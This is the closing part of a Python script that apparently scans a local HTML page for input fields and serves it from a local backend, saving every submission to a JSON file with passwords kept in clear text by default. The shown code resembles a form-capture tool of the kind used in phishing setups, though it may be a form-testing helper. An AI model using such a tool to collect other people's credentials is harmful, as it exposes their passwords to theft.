                sys.exit(1)

        html_path = clean_path(raw).resolve()
        if not html_path.is_file():
            lines = [f"File not found: {html_path}"]
            if "com.termux" in os.environ.get("PREFIX", ""):
                lines.append("Termux tip: run `termux-setup-storage`, then use ~/storage/shared/...")
            print_box(lines, title="ERROR", color=C.ERR)
            _pause_before_exit()
            sys.exit(1)
        ok_line(f"using HTML file: {html_path}")

        step_header(2, 3, "Scan the page for inputs")
        scanner = FieldScanner()
        scanner.feed(read_html(html_path))
        db_path = html_path.with_name(html_path.stem + "_data.json")
        found_lines = [f"Detected inputs : {len(scanner.found)}"]
        for name, t in scanner.found:
            found_lines.append(f"   - {name} ({t})")
        print_box(found_lines, title="DETECTED INPUTS", color=C.GREY)

        step_header(3, 3, "Start the backend server")
        server = None
        for port in range(args.port, args.port + 11):
            try:
                server = QuietServer((args.host, port), Handler)
                break
            except OSError:
                continue
        if server is None:
            print_box([f"No free port in {args.port}-{args.port + 10}"], title="ERROR", color=C.ERR)
            _pause_before_exit()
            sys.exit(1)

        server.cfg = {"html": html_path, "base": html_path.parent, "db": db_path,
                      "plain": not args.hash_passwords}

        print()
        print_box(
            [
                f"Passwords       : {'clean text (as typed)' if not args.hash_passwords else 'hashed'}",
                f"Open in browser : http://{'127.0.0.1' if args.host == '0.0.0.0' else args.host}:{server.server_address[1]}/",
                f"Data saved to   : {db_path}",
                "",
                "Switching to full-screen live view ...",
            ],
            title="BACKEND IS LIVE", color=C.ORANGE,
        )

        # the step-by-step history above disappears here - only the live
        # dashboard (this function's own output) stays on screen from now
        set_dashboard_header([
            f"Passwords       : {'clean text (as typed)' if not args.hash_passwords else 'hashed'}",
            f"Open in browser : http://{'127.0.0.1' if args.host == '0.0.0.0' else args.host}:{server.server_address[1]}/",
            f"Data saved to   : {db_path}",
            "Stop with Ctrl+C",
        ])
        try:
            start_dashboard()
            server.serve_forever()
        except KeyboardInterrupt:
            pass
        finally:
            server.server_close()
    except KeyboardInterrupt:      # Ctrl+C at ANY step still shows the farewell
        pass
    except SystemExit:             # sys.exit() inside a step (bad file, port, etc.) too
        pass
    finally:
        leave_app_screen()   # restores the user's real terminal, untouched

    try:
        print_farewell()   # logo + (backend) + developer credit + come again
    except KeyboardInterrupt:
        pass
    sys.exit(0)   # the application has fully exited back to the command line


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print()
        sys.exit(0)
